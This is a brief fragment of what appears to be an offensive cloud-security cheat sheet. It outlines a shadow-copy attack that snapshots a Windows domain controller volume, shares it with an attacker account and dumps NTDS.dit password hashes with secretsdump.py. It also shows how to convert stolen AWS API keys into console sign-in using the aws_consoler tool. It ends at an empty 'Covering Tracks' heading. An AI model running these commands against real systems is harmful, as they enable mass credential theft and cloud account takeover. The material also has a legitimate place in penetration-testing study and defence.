# Shadow Copy Attack (Windows DC)

```bash
# CloudCopy technique
# 1. Create snapshot of DC volume
# 2. Share snapshot with attacker account
# 3. Mount in attacker instance
# 4. Extract NTDS.dit and SYSTEM
secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
```

---

## Console Access from API Keys

Convert CLI credentials to console access:

```bash
git clone https://github.com/NetSPI/aws_consoler
aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY

# Generates signin URL for console access
```

---

## Covering Tracks